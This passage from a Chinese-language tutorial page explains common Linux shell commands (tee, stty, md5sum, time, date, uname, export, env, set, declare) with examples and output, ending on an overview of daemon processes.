echo aaa | tee file       # 打印同时写入文件

tee f1 <<-'EOF'           # 输入结束时另起一行输入EOF即可自动结束

</pre>

<h4>stty命令</h4><pre>
stty命令修改终端命令行的相关设置。

stty (选项) (参数)
-a选项:以容易阅读的方式打印当前的所有配置;
-g选项:以stty可读方式打印当前的所有配置。
参数终端设置:指定终端命令行的设置选项。

$ stty -a
speed 38400 baud; rows 33; columns 153; line = 0;
intr = ^C; quit = ^\; erase = ^?; kill = ^U; eof = ^D; eol = M-^?; eol2 = M-^?; swtch = M-^?; start = ^Q; stop = ^S; susp = ^Z; rprnt = ^R; werase = ^W;
lnext = ^V; discard = ^O; min = 1; time = 0;
-parenb -parodd -cmspar cs8 hupcl -cstopb cread -clocal -crtscts
-ignbrk brkint -ignpar -parmrk -inpck -istrip -inlcr -igncr icrnl ixon -ixoff -iuclc ixany imaxbel iutf8
opost -olcuc -ocrnl onlcr -onocr -onlret -ofill -ofdel nl0 cr0 tab0 bs0 vt0 ff0
isig icanon iexten echo echoe echok -echonl -noflsh -xcase -tostop -echoprt echoctl echoke -flusho -extproc

在命令行下禁止输出大写的方法:
stty iuclc     # 开启
stty -iuclc    # 恢复

在命令行下禁止输出小写:
stty olcuc    # 开启
stty -olcuc   # 恢复

打印出终端的行数和列数:
stty size

改变Ctrl+D的方法:
stty eof "string"
系统默认是Ctrl+D来表示文件的结束,而通过这种方法,可以改变！

屏蔽显示:
stty -echo   # 禁止回显
stty echo    # 打开回显
stty -echo;read;stty echo;read

忽略回车符:
stty igncr     # 开启
stty -igncr    # 恢复

定时输入:
timeout_read()
{
    timeout=$1
    old_stty_settings=`stty -g`　　#save current settings
    stty -icanon min 0 time 100　　#set 10seconds,not 100seconds
    eval read varname　　          #=read $varname
    stty "$old_stty_settings"　　  #recover settings
}
更简单的方法就是利用read命令的-t选项:
read -t 10 varname

</pre>

<h4>md5sum命令</h4><pre>
md5sum命令采用MD5报文摘要算法(128位)计算和检查文件的校验和。一般安装了Linux后就会有md5sum这个工具,直接在命令行终端直接运行。

MD5算法常被用来验证网络文件传输的完整性,防止文件被人篡改,MD5全称是报文摘要算法(Message-Digest Algorithm 5),此算法对任意长度的信息逐位进行计算,产生一个二进制长度为128位(十六进制长度就是32位)的"指纹"或称"报文摘要",不同的文件产生相同的报文摘要的可能性是非常非常之小的。

语法
md5sum (选项) (参数)

选项
-b:二进制模式读取文件;
-t或--text:把输入的文件作为文本文件看待;
-c:从指定文件中读取MD5校验和,并进行校验;
--status:验证成功时不输出任何信息;
-w:当校验不正确时给出警告信息。

参数
文件:指定保存着文件名和校验和的文本文件。

$ echo -n 123456 | md5sum
e10adc3949ba59abbe56e057f20f883e  -

$ md5sum insert.sql     # 生成一个文件insert.sql的md5值
bcda6cb5c704664f989703ac5a88f112  insert.sql

</pre>检查文件testfile是否被修改过<textarea>首先生成md5文件:
md5sum testfile > testfile.md5

检查:
md5sum testfile -c testfile.md5
如果文件没有变化,md5sum命令返回0,输出应该如下:
forsort: OK

如果文件发生了变化,md5sum命令返回非0,输出应该如下:
forsort: FAILED
md5sum: WARNING: 1 of 1 computed checksum did NOT match

如果不想有任何输出则md5sum testfile --status -c testfile.md5,这时候通过返回值来检测结果。

检测的时候如果检测文件非法则输出信息的选项:
md5sum -w -c testfile.md5
输出之后,文件异常输出类似如下:
md5sum: testfile.md5: 1: improperly formatted MD5 checksum line
md5sum: testfile.md5: no properly formatted MD5 checksum lines found
这里testfile.md5只有一行信息,但是人为地给它多加了一个字符导致非法。如果md5文件正常那么-w有没有都一样

</textarea><pre>
批量检测文件的完整性
如果目录下有md5.md5文件,该文件描述了该文件夹下的所有文件的MD5值,可批量校验
该文件的内容为一个文件一行,格式为< MD5 >< TAB >< FILEPATH >
使用以下命令进行批量校验:
md5sum -c md5.md5

</pre>

<h4>time命令</h4><pre>
测量特定指令执行时所需消耗的时间及系统资源等资讯,例如CPU时间、记忆体、输入输出等,部分资讯在Linux上显示不出来,因为在Linux上部分资源的分配函式与time指令所预设的方式并不相同,以致于time指令无法取得这些资料

语法
time [options] COMMAND [arguments]

参数:
-o 或 --output=FILE:设定结果输出档,这个选项会将time的输出写入所指定的档案中,如果档案已经存在系统将覆写其内容。
-a 或 --append:配合-o使用将结果写到档案的末端,而不会覆盖掉原来的内容。
-f FORMAT 或 --format=FORMAT:以FORMAT字串设定显示方式,默认使用系统预设的格式。不过可以用环境变数time来设定这个格式,如此一来就不必每次登入系统都要设定一次。

time指令可以显示的资源有四大项,分别是:
Time resources
Memory resources
IO resources
Command info
详细的内容如下:
1、Time Resources
E 执行指令所花费的时间,格式[hour]:minute:second,这个数字并不代表实际的CPU时间。
e 执行指令所花费的时间,单位是秒,这个数字并不代表实际的CPU时间。
S 指令执行时在核心模式(kernel mode)所花费的时间,单位是秒。
U 指令执行时在使用者模式(user mode)所花费的时间,单位是秒。
P 执行指令时CPU的占用比例,其实这个数字就是核心模式加上使用者模式的CPU时间除以总时间。
2、Memory Resources
M 执行时所占用的实体记忆体的最大值。单位是KB
t 执行时所占用的实体记忆体的平均值,单位是KB
K 执行程序所占用的记忆体总量(stack+data+text)的平均大小,单位是KB
D 执行程序的自有资料区(unshared data area)的平均大小,单位是KB
p 执行程序的自有堆叠(unshared stack)的平均大小,单位是KB
X 执行程序间共享内容(shared text)的平均值,单位是KB
Z 系统记忆体页的大小,单位是byte,对同一个系统来说这是个常数
3、IO Resources
F 此程序的主要记忆体页错误发生次数,主要记忆体页错误指某一记忆体页已经置换到置换档(swap file)中,而且已经分配给其他程序。此时该页的内容必须从置换档里再读出来。
R 此程序的次要记忆体页错误发生次数。所谓的次要记忆体页错误是指某一记忆体页虽然已经置换到置换档中,但尚未分配给其他程序。此时该页的内容并未被破坏,不必从置换档里读出来
W 此程序被交换到置换档的次数
c 此程序被强迫中断(像是分配到的CPU时间耗尽)的次数
w 此程序自愿中断(像是在等待某一个I/O执行完毕,像是磁碟读取等)的次数
I 此程序所输入的档案数
O 此程序所输出的档案数
r 此程序所收到的Socket Message
s 此程序所送出的Socket Message
k 此程序所收到的信号(Signal)数量
4、Command Info
C 执行时的参数以及指令名称
x 指令的结束代码(Exit Status)
-p or --portability:这个选项会自动把显示格式设定成为:
real %e user %Usys %S:这么做的目的是为了与POSIX规格相容。
-v or --verbose:这个选项会把所有程序中用到的资源都列出来,不但如一般英文语句,还有说明

$ time date
Sat Nov  9 22:07:17 CST 2019
real    0m0.094s
user    0m0.000s
sys     0m0.031s

系统先执行命令"date",第2行为命令"date"的执行结果。后面为执行命令"date"的时间统计结果,其中"real"为实际时间,"user"为用户CPU时间,"sys"为系统CPU时间,以上三种时间的显示格式均为MMmNN[.FFF]s。

</pre>

<h4>cal、date命令</h4><pre>
cal命令
显示月份的日历

date命令用于显示及设置系统的时间或日期,格式为"date [选项] [+指定的格式]"

date [-u] [-d datestr] [-s datestr] [--utc] [--universal] [--date=datestr] [--set=datestr] [--help] [--version] [+FORMAT] [MMDDhhmm[[CC]YY][.ss]]
参数:
-d datestr : 显示datestr中所设定的时间(非系统时间)
-s datestr : 将系统时间设为datestr中所设定的时间
-u : 显示目前的格林威治时间
--version : 显示版本编号
--help : 显示辅助讯息

$ date                        # Sat Nov  9 22:09:27 CST 2019
$ date "+%Y-%m-%d %H:%M:%S"   # 2019-11-09 22:10:08
$ date "+%j"                  # 查看今天是当年中的第几天
$ date -s "20170901 8:30:00"  # 设置系统的当前时间

时间:
% : 印出 %
%n : 下一行
%t : 跳格
%H : 小时(00..23)
%I : 小时(01..12)
%k : 小时(0..23)
%l : 小时(1..12)
%M : 分钟(00..59)
%p : 显示本地 AM 或 PM
%r : 直接显示时间(12 小时制,格式为 hh:mm:ss [AP]M)
%s : 从 1970 年 1 月 1 日 00:00:00 UTC 到目前为止的秒数
%S : 秒(00..61)
%T : 直接显示时间(24 小时制)
%X : 相当于 %H:%M:%S
%Z : 显示时区

日期方面:
%a : 星期几(Sun..Sat)
%A : 星期几(Sunday..Saturday)
%b : 月份(Jan..Dec)
%B : 月份(January..December)
%c : 直接显示日期与时间
%d : 日(01..31)
%D : 直接显示日期(mm/dd/yy)
%h : 同 %b
%j : 一年中的第几天(001..366)
%m : 月份(01..12)
%U : 一年中的第几周(00..53)(以 Sunday 为一周的第一天的情形)
%w : 一周中的第几天(0..6)
%W : 一年中的第几周(00..53)(以 Monday 为一周的第一天的情形)
%x : 直接显示日期(mm/dd/yy)
%y : 年份的最后两位数字(00.99)
%Y : 完整年份(0000..9999)

若是不以加号作为开头则表示要设定时间,而时间格式为MMDDhhmm[[CC]YY][.ss],其中MM为月份,DD为日,hh为小时,mm为分钟,CC为年份前两位数字,YY为年份后两位数字,ss为秒数。

当不希望出现无意义的0时(比如说1999/03/07)可以在标记中插入-符号,如date '+%-H:%-M:%-S'会把时分秒中无意义的0给去掉,即08:09:04会变为8:9:4。

只有取得权限者如root才能设定系统时间,当以root身分更改了系统时间之后以clock -w将系统时间写入CMOS中,这样下次重新开机时系统时间才会持续抱持最新的正确值。

echo 显示当前时间
date              // Thu Jun 14 20:52:47 DST 2018
date '+%c'        // Thu 14 Jun 2018 08:52:48 PM DST
date '+%D'        // 06/14/18
date '+%x'        // 06/14/2018
date '+%T'        // 20:52:49
date '+%X'        // 08:52:49 PM

echo 按格式输出
date '+user_time: $1:%M %P -hey'   // user_time: $1:52 pm -hey

echo 显示时间后跳行,再显示目前日期
date '+%T%n%D'

// 20:52:50
// 06/14/18

echo 显示月份与日数
date '+%B %d'      // June 14

echo 显示日期与设定时间12:34:56
#date --date '12:34:56'

</pre><textarea>#!/bin/bash
start=`date +%s`
ls -al >/dev/null 2>&1

sleep 5s
end=`date +%s`
dif=$[ end - start ]
echo $dif

</textarea>%n表示纳秒数,%s表示是由1970以来的秒数,1毫秒 等于 1000 * 1000 纳秒,1000微秒<textarea>start_tm=`date +%s%N`;
sleep 10;
end_tm=`date +%s%N`;
use_tm=`echo $end_tm $start_tm | awk '{ print($1 - $2) / 1000000000}'`
echo $use_tm

</textarea>

<h4>uname命令</h4><pre>
用于查看系统内核与系统版本等信息,格式为"uname [-a]"
$ uname                 # 显示当前系统
Linux

$ uname -r              # 显示当前系统内核版本号
4.4.0-17134-Microsoft

$ uname -a              # 查看linux内核版本信息
$ uname --all
Linux LAPTOP-0KMQM01D 4.4.0-17134-Microsoft #112-Microsoft Thu Jun 07 22:57:00 PST 2018 x86_64 x86_64 x86_64 GNU/Linux

x86-64有时简称x64,是64位微处理器架构及其相应指令集的一种,也是Intel x86架构的延伸产品。x86-64由AMD设计AMD64,其后也为Intel所采用,现时英特尔称之为"Intel 64"
$ uname -m              # 查看操作系统是32位的还是64位的,x86_64表示安装64位操作系统
x86_64
$ uname -p
x86_64

$ cat /proc/version     # 查看linux内核版本
Linux version 4.15.0-23-generic(buildd@lgw01-amd64-055)(gcc version 7.3.0(Ubuntu 7.3.0-16ubuntu3) #25-Ubuntu SMP Wed May 23 18:02:16 UTC 2018

$ dpkg --print-architecture      # amd64
$ dpkg --print-architecture | awk -F- '{ print $NF }'  # amd64

$ uname -n              #  显示网络主机名
LAPTOP-0KMQM01D

查看hostname和ip配置:cat /etc/hosts
查看默认的DNS服务器地址:cat /etc/resolv.conf

Linux内核版本有两种:稳定版和开发版,Linux内核版本号由3个数字组成:r.x.y
r:目前发布的内核主版本。
x:偶数表示稳定版本;奇数表示开发中版本。
y:错误修补的次数。

内核版本号每位都代表什么 ?以版本号为例: 2.6.18-128.ELsmp ,
r:  2,主版本号
x:  6,次版本号,表示稳定版本
y:  18,修订版本号,表示修改的次数,头两个数字合在一齐可以描述内核系列。如稳定版的2.6.0,它是2.6版内核系列。
128:  表示这个当前版本的第5次微调patch,而ELsmp指出了当前内核是为ELsmp特别调校的
EL:   Enterprise Linux
smp : 表示支持多处理器,表示该内核版本支持多处理器

$ lsb_release -cs  # xenial,查看系统类型

ubuntu查看mac地址可使用以下四种不同的命令:02:50:f2:bd:31:03
1、ifconfig | awk '/eth/{print $1,$5}'
2、arp -a | awk '{print $4}
3、sudo lshw -C network
4、sudo lshw -c network | grep serial
5、ifconfig -a每个interface的第一行HWaddr后面就是MAC address;eth为网卡,如果有二块的话会有eth0与eth1,MAC地址在第一行的硬件地址

查看Ubuntu的版本号
1、cat /etc/issue
# Ubuntu 16.04.3 LTS \n \l
2、cat /proc/version
# Linux version 4.4.0-43-Microsoft(Microsoft@Microsoft.com)(gcc version 5.4.0(GCC) ) #1-Microsoft Wed Dec 31 14:42:53 PST 2014
3、lsb_release -a
No LSB modules are available.
Distributor ID: Ubuntu
Description:    Ubuntu 16.04.3 LTS
Release:        16.04
Codename:       xenial
4、cat /etc/os-release
NAME="Ubuntu"
VERSION="16.04.4 LTS(Xenial Xerus)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 16.04.4 LTS"
VERSION_ID="16.04"
HOME_URL="http://www.ubuntu.com/"
SUPPORT_URL="http://help.ubuntu.com/"
BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"
VERSION_CODENAME=xenial
UBUNTU_CODENAME=xenial
5、file /bin/bash
/bin/bash: ELF 64-bit LSB shared object, x86-64, version 1(SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=b636f50d85c3cca7cf2518030446660c1d90d660, stripped
6、file /bin/cat
/bin/cat: ELF 64-bit LSB shared object, x86-64, version 1(SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=747e524bc20d33ce25ed4aea108e3025e5c3b78f, stripped

</pre>

<h4>hostname命令</h4><pre>
显示和临时设置系统的主机名称。环境变量HOSTNAME也保存了当前的主机名,永久修改主机名需要修改/etc/hostname

hostname             # 查询当前主机名
hostname -i          # 显示当前主机名的IP,127.0.1.1
linuxcast@linuxcast  # linuxcast用户登录到主机linuxcast
cat /etc/hosts       # 查询静态主机名

ifconfig显示当前系统网络的实际使用配置情况,这种配置可以用ifconfig实时更改,但重启系统后就失效了
hostname -i读取/etc/hosts文件来确认hostname对应的IP地址,这个结果可能不是当前系统网络的实际配置,因为ifconfig命令配置的实际网络环境不更改/etc/hosts文件中的配置,但如果重启系统,系统初始IP的配置一定是用/etc/hosts来配置网络的。
比如/etc/hosts中配置APPLE 192.168.0.1,刚启动系统时用ifconfig和hostname -i看到的系统IP都是192.168.0.1,这时如果用ifconfig命令更改了网络地址为:192.168.0.2,那么ifconfig和hostname -i看到的就不同了,ifconfig看到的是192.168.0.2,hostname -i看到的是192.168.0.1,这时重启系统再看ifconfig和hostname -i系统IP又都是192.168.0.1,手动用ifconfig配置的临时IP设置在重启时失效了

</pre><pre>

uptime命令
用于查看系统的负载信息,uptime显示目前系统开机时间(查看开机多久,多少人登陆,过去1,5,15分钟系统的负载)

free命令
用于显示当前系统中内存的使用量信息,格式为"free [-h]"

who命令
用于查看当前登入主机的用户终端信息,格式为"who [参数]"

last命令
用于查看所有系统的登录记录,格式为"last [参数]"
last列出您最后登录的指定用户,ast yourUsername

sosreport命令
用于收集系统配置及架构信息并输出诊断文档

reboot命令
用于重启系统

poweroff命令
用于关闭系统

shutdown命令
用来进行关机程序,并且在关机以前传送讯息给所有使用者正在执行的程序,shutdown也可以用来重开机。
使用权限:系统管理者
shutdown [-t seconds] [-rkhncfF] time [message]
-t seconds : 设定在几秒钟之后进行关机程序
-k : 并不会真的关机,只是将警告讯息传送给所有只用者
-r : 关机后重新开机
-h : 关机后停机
-n : 不采用正常程序来关机,用强迫的方式杀掉所有执行中的程序后自行关机
-c : 取消目前已经进行中的关机动作
-f : 关机时,不做fcsk动作(检查Linux档系统)
-F : 关机时,强迫进行fsck动作
time : 设定关机的时间
message : 传送给所有使用者的警告讯息

# shutdown -h now  # 立即关机
# shutdown +5 "System will shutdown after 5 minutes" # 5分钟够关机并显示警告信息

</pre>

<h4>history命令</h4><pre>
用于显示历史执行过的命令,格式为"history [-c]"
!!       重复前一个命令
!字符    重复前一个以指定字符开头的命令
!num     按历史记录序号执行命令注:num为序号,如1 2 3
!?abc    重复之前包含abc的命令注:a,b,c为命令中包含的字母
!-n      重复n个命令之前那个命令注:是第n个命令之前,我输入的是第4个序号,应该输出为第3个命令
可以通过ctrl + r来对历史记录进行搜索查询

</pre>

<h4>seq命令</h4><pre>
用于产生从某个数到另外一个数之间的所有整数,默认是每行一个整数,-s指定分隔符

Usage: seq [OPTION]... LAST
  or:  seq [OPTION]... FIRST LAST
  or:  seq [OPTION]... FIRST INCREMENT LAST
Print numbers from FIRST to LAST, in steps of INCREMENT
FIRST INCREMENT默认为1
INCREMENT可设置成负数,表示递减

选项
-f, --format=FORMAT    use printf style floating-point FORMAT(default: %g),指定格式,使用printf样式的浮点格式
-s, --separator=STRING use STRING to separate numbers(default: /n),使用指定字符串分隔数字(默认使用:\n)
-w, --equal-width      equalize width by padding with leading zeroes,在列前添加0使得宽度相同

</pre><textarea># seq 1 10       // 1 2 3 4 5 6 7 8 9 10

#!/bin/bash
for i in `seq 1 10`;
do
  echo $i;
done

for i in $(seq 1 10)

</textarea><pre>
$ seq -f"%3g" 9 11
  9
 10
 11

%后面指定数字的位数,默认是"%g","%3g"那么数字位数不足部分是空格
#sed -f"%03g" 9 11 这样的话数字位数不足部分是0
% 前面制定字符串

$ seq -f"%03g" 9 11
009
010
011

-w 指定输出数字同宽,不能和-f一起用
seq -w -f"str%03g" 9 11
seq: format string may not be specified when printing equal width strings

$ seq -w 98 101
098
099
100
101

-s 指定分隔符,默认是回车
seq -s" " -f"str%03g" 9 11
str009 str010 str011

要指定/t 做为分隔符号
seq -s"`echo -e "/t"`" 9 11

指定/n/n作为分隔符号
seq -s"`echo -e "/n/n"`" 9 11
19293949596979899910911
得到的是个错误结果,不过一般也没有这个必要,它默认的就是回车作为分隔符

$ seq -s + -f 100%g  10    # 1001+1002+1003+1004+1005+1006+1007+1008+1009+10010
# seq -s "+" 10            # 1+2+3+4+5+6+7+8+9+10

</pre>

<h4>export命令</h4><pre>
临时设置或显示所有的环境变量,如果想获取某个变量的详细信息使用echo $VARIABLE_NAME
在shell中执行程序时shell会提供一组环境变量。export可新增、修改或删除环境变量,供后续执行的程序使用

export [-fnp][变量名称]=[变量设置值]
-f 　代表[变量名称]中为函数名称。
-n 　删除指定的变量,变量实际上并未删除,只是不会输出到后续指令的执行环境中。
-p 　列出所有的shell赋予程序的环境变量。

$ export -p             # 列出当前的环境变量值
$ export MYENV          # 定义环境变量
$ export MYENV=7        # 定义环境变量并赋值
$ export name           # 变量name由本地升为环境
$ export name="RedHat"  # 直接定义name为环境变量
$ export Stat$nu=2222   # 变量引用变量赋值
$ export -n name        # 去掉只读变量

如果想要添加一个环境变量则在/etc/profile文件中,使用export PATH=$PATH:AAAA,然后使用source该文件使修改生效,或修改/etc/enviroment文件中的path
修改环境变量,最好不要在/etc/profile中修改,推荐在用户的目录下创建.bashrc或者.profile文件来修改,然后再source

</pre><textarea>$ export -p
declare -x HOME="/home/berlin75"
declare -x HOSTTYPE="x86_64"
declare -x LANG="en_US.UTF-8"
declare -x LESSCLOSE="/usr/bin/lesspipe %s %s"
declare -x LESSOPEN="| /usr/bin/lesspipe %s"
declare -x LOGNAME="berlin75"
declare -x LS_COLORS="rs=0:di=01;...;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:"
declare -x NAME="LAPTOP-0KMQM01D"
declare -x OLDPWD="/mnt/e/wamp64/www/study/shell"
declare -x PATH="/home/berlin75/bin:/mnt/c/Users/lenovo/AppData/Roaming/npm:/mnt/e/soft/vscode/Microsoft VS Code/bin:/snap/bin"
declare -x PWD="/home/berlin75"
declare -x SHELL="/bin/bash"
declare -x SHLVL="1"
declare -x TERM="xterm-256color"
declare -x USER="berlin75"
declare -x XDG_DATA_DIRS="/usr/local/share:/usr/share:/var/lib/snapd/desktop"

</textarea>

<h4>env命令</h4><pre>
env命令显示系统中已存在的环境变量,以及在定义的环境中执行指令。该命令只使用"-"作为参数选项时隐藏了选项"-i"的功能。若没有设置任何选项和参数时则直接显示当前的环境变量。
如果使用env命令在新环境中执行指令时会因为没有定义环境变量"PATH"而提示错误信息"such file or directory"。此时用户可以重新定义一个新的"PATH"或使用绝对路径。

env(选项)(参数)

选项
-i:开始一个新的空的环境
-u<变量名>:从当前环境中删除指定的变量

参数
变量定义:定义在新的环境中变量,定义多个变量定义用空格隔开。格式为"变量名=值";
指定:指定要执行的指令和参数

env                # 查看环境变量
env | grep "name"  # 查看定义的环境变量

</pre><textarea>$ env
SHELL=/bin/bash
TERM=xterm-256color
OLDPWD=/mnt/e/wamp64/www/study/shell
USER=berlin75
NAME=LAPTOP-0KMQM01D
LS_COLORS=rs=0:d...us=00;36:*.spx=00;36:*.xspf=00;36:
HOSTTYPE=x86_64
PATH=/home/berlin75/bin:/mnt/e/soft/vscode/Microsoft VS Code/bin:/snap/bin
PWD=/home/berlin75
LANG=en_US.UTF-8
SHLVL=1
HOME=/home/berlin75
LOGNAME=berlin75
XDG_DATA_DIRS=/usr/local/share:/usr/share:/var/lib/snapd/desktop
LESSOPEN=| /usr/bin/lesspipe %s
LESSCLOSE=/usr/bin/lesspipe %s %s
_=/usr/bin/env

</textarea>

<h4>set命令</h4><pre>
用于设置shell,set指令能设置所使用shell的执行方式,可依照不同的需求来做设置。

set [+-abCdefhHklmnpPtuvx]
-a 　标示已修改的变量,以供输出至环境变量。
-b 　使被中止的后台程序立刻回报执行状态。
-C 　转向所产生的文件无法覆盖已存在的文件。
-d 　Shell预设会用杂凑表记忆使用过的指令,以加速指令的执行。使用-d参数可取消。
-e 　若指令传回值不等于0则立即退出shell。如果脚本里面有运行失败的命令(返回值非0),Bash默认会继续执行后面的命令
-f　 取消使用通配符。
-h 　自动记录函数的所在位置。
-H Shell 　可利用"!"加<指令编号>的方式来执行history中记录的指令。
-k 　指令所给的参数都会被视为此指令的环境变量。
-l 　记录for循环的变量名称。
-m 　使用监视模式。
-n 　只读取指令,而不实际执行。
-p 　启动优先顺序模式。
-P 　启动-P参数后,执行指令时,会以实际的文件或目录来取代符号连接。
-t 　执行完随后的指令,即退出shell。
-u 　当执行时使用到未定义过的变量则显示错误信息。执行脚本时,如果遇到不存在的变量,Bash默认忽略它
-v 　显示shell所读取的输入值。
-x 　执行指令后会先显示该指令及所下的参数。
+<参数> 　取消某个set曾启动的参数。

# set          # 查看环境变量和本地变量
# set | more   # 分页显示环境变量

set -e   # Exit the script if an error happens
set -e   # Exit immediately if a simple command exits with a non-zero status
set +e   # don't bail out of bash script if ccache doesn't exist

set -euxo pipefail
执行指令后会先显示该指令及所下的参数,未定义过的变量会显示错误信息,脚本或其中管道存在错误即退出

</pre>

<h4>declare命令</h4><pre>
declare命令用于声明shell变量。
declare或typeset内建命令(它们是完全相同的)可以用来限定变量的属性,这是在某些编程语言中使用的定义类型不严格的方式。命令declare是bash版本2之后才有的,命令typeset也可以在ksh脚本中运行

declare为shell指令,在第一种语法中可用来声明变量并设置变量的属性([rix]即为变量的属性),在第二种语法中可用来显示shell函数。
若不加上任何参数则会显示全部的shell变量与函数(与执行set指令的效果相同)。

语法
declare [+/-][rxi][变量名称＝设置值]  可用来声明变量并设置变量的属性([rix]即为变量的属性)
declare -f                           可用来显示shell函数

参数说明:
+/-
"-"可用来指定变量的属性,"+"则是取消变量所设的属性。

-f
仅显示函数
declare -f                # 在脚本中没有带任何参数的declare -f 会列出所有在此脚本前面已定义的函数详细代码出来。
declare -f function_name  # 只会列出指定的函数
declare -F                # 显示当前可见的所有函数

r 　
将变量设置为只读,不能修改值、属性和unset删除。declare -r var1与readonly var1作用相同
declare -r var2=13.36

x 　
指定的变量会成为环境变量,可供shell以外的程序来使用。
declare -x var3       # 这样将声明一个变量作为脚本的环境变量而被导出。
declare -x var3=373   # declare命令允许在声明变量类型的时候同时给变量赋值

i 　
[设置值]可以是数值,字符串或运算式。

-p
查看类型
$ declare -p var
$ declare -p USER   # declare -x USER="berlin75"

</pre>声明整数型变量,改变变量属性<textarea>declare -i number           # 声明整数型变量,脚本余下的部分会把"number"当作整数看待
number=3                    # 改变变量内容
echo "Number = $number"     # Number = 3
number=three
echo $number                # 0,脚本尝试把字符串"three"作为整数来求值,当然会失败,所以出现值为0
declare +i number           # 取消变量属性
number="wer"
echo $number                # wer

</textarea>某些算术计算允许在被声明为整数的变量中完成,而不需要特别使用expr或let来完成<textarea>n=6/3
echo "n = $n"       # n = 6/3

declare -i n
n=6/3
echo "n = $n"       # n = 2

declare +i n

n=6/3
echo "n = $n"       # n = 6/3

# 因为变量x不是整型变量,所以不会自动对表达式求值。可以采用下面两个方式。
n=$[6/3]
echo $n             # 2
n=$((6/3)
echo $n             # 2

</textarea>设置变量只读<textarea># declare -r ab             # 设置变量为只读
# ab=88                     # 改变变量内容
-bash: ab: 只读变量
# echo $ab                  # 56

</textarea>-a 声明数组变量<textarea># declare -a cd='([0]="a" [1]="b" [2]="c")'
# echo ${cd[1]}    // b
# echo ${cd[@]}    // a b c

</textarea>显示函数<textarea># declare -f
command_not_found_handle()
{
  if [ -x /usr/lib/command-not-found ]; then
    /usr/bin/python /usr/lib/command-not-found -- $1;
    return $?;
  else
    if [ -x /usr/share/command-not-found ]; then
      /usr/bin/python /usr/share/command-not-found -- $1;
      return $?;
    else
      return 127;
    fi;
  fi
}

</textarea><textarea>#!/bin/bash

func1(){
  echo This is a function.
}

declare -f                    # 列出上面的函数
declare -i var1               # var1是一个整数
var1=2367
echo "var1 declared as $var1"

var1=var1+1                   # 整数声明后,不需要使用'let'
echo "var1 incremented by 1 is $var1."

echo "Attempting to change var1 to floating point value(试图将已声明为整数的变量的值更改为浮点值), 2367.1."
var1=2367.1                   # 引起一个错误信息,此变量的值保持原样
echo "var1 is still $var1"

declare -r var2=13.36         # 'declare'允许设置变量的属性,同时也给变量赋值
echo "var2 declared as $var2" # 试图更改只读变量的值
var2=13.37                    # 引起错误,此变量的值保持原样
echo "var2 is still $var2"
exit 0

</textarea>

<h4>daemon守护进程</h4><pre>
服务一般以d结尾,daemon守护进程

Linux Daemon(守护进程)是运行在后台的一种特殊进程,它独立于控制终端并且周期性地执行某种任务或等待处理某些发生的事件。它不需要用户输入就能运行而且提供某种服务,不是对整个系统就是对某个用户程序提供服务。Linux系统的大多数服务器就是通过守护进程实现的。常见的守护进程包括系统日志进程syslogd、web服务器httpd、邮件服务器sendmail和数据库服务器mysqld等。

守护进程一般在系统启动时开始运行,除非强行终止,否则直到系统关机都保持运行。守护进程经常以超级用户(root)权限运行,因为它们要使用特殊的端口(1-1024)或访问某些特殊的资源。

一个守护进程的父进程是init进程,因为它真正的父进程在fork出子进程后就先于子进程exit退出了,所以它是一个由init继承的孤儿进程。守护进程是非交互式程序,没有控制终端,所以任何输出无论是向标准输出设备stdout还是标准出错设备stderr的输出都需要特殊处理。

守护进程的名称通常以d结尾,比如sshd、xinetd、crond等

必须得有守护进程守护着,如果服务器一崩溃,立马及时重启,保证整个业务能继续运行,不能影响玩家体验

【 启动一个守护进程的几种方式 】
1、在系统期间通过系统的初始化脚本启动守护进程,这些脚本通常在目录etc/rc.d下,通过它们所启动的守护进程具有超级用户的权限,系统的一些基本服务通常都是通过这种方式启动的。
2、很多网络服务程序都是由inetd守护程序启动的。它监听各种网络请求如telnet、ftp等,在请求到达时启动相应的服务器程序(telnet server,ftp server等)。
3、由cron定时启动的处理程序,这些程序在运行时实际上也是一种守护进程。
4、由at启动的处理程序。
5、守护程序也可以从终端启动,通常这种方式只用于守护进程的测试或是重启因某种原因而停止的进程。
6、在终端上用nohup启动的进程,用这种方法可以把所有的程序都变成守护进程。

Daemon是Linux的一些系统服务,是一些常驻内存的进程。

Daemon拥有两种分类方式:
按照"daemon是否可以在内存中独立启动"可以分为:stand alone和super daemon
按照"请求到来时是否能够立即运行"可分为:signal-control和interval-control

stand alone类型的daemon
这种类型的daemon可以自行启动,启动之后可以常驻内存,直到手动关闭该daemon才释放资源。

super daemon管理的daemon
这种类型的daemon由super daemon统一管理,当请求到来时由super daemon启动请求的服务,请求完成后便释放内存资源。

两者的区别:
stand alone类型的daemon可以自行启动,无需依赖其他daemon;而super daemon管理的daemon必须借助super daemon来启动;
stand alone类型的daemon启动后便常驻内存,而被super daemon管理的daemon只有等到用户请求时才被加载进内存,并且在请求完成后便释放内存资源。由于后者每次请求到来的时候才被加载进内存,因此响应速度比stand alone型daemon要慢。但是它执行完就释放内存资源,因此更节约内存资源。

signal-control类型的daemon
这种类型的daemon当有请求到来时便能立即执行。

interval-control类型的daemon
这种类型的daemon会周期性地执行某项工作,因此它没有请求一说,它会周期性地读取配置文件,并执行配置文件中要求的功能。如crond、atd都属于interval-control类型的daemon。

Daemon的启动方式
stand-alone类型的daemon和super daemon类型的daemon有各自的启动方式。

stand alone型Daemon的启动方式
通过/etc/init.d/xxx启动
启动一个服务是一个繁琐的过程,需要进行一系列启动前的操作,为了避免这些麻烦,服务提供商把这些繁琐的过程封装在一个shell srcipt中,只需执行一个shell script即可启动一个daemon。几乎所有的stand alone型daemon的启动脚本都放在/etc/init.d/下,所以只需执行/etc/init.d/xxx start即可启动xxx服务。

通过service命令启动
若每次启动一个命令都要写/etc/init.d/略微有些麻烦,service命令将其进行了封装,只要执行service xxx start/status/restart/stop即可开启/查看/重启/关闭xxx服务。

super daemon型Daemon的启动方式
step1:设置daemon的配置文件,每一个被super daemon管理的daemon都有一个配置文件,在/etc/xinetd.d/目录下,每个daemon的开启或关闭均在该daemon对应的配置文件中设置。
step2:启动super daemon,super daemon是一个stand alone型daemon,因此在daemon的配置文件设置好后可通过service xinetd start启动所有由super daemon管理的daemon。

与daemon相关的目录介绍
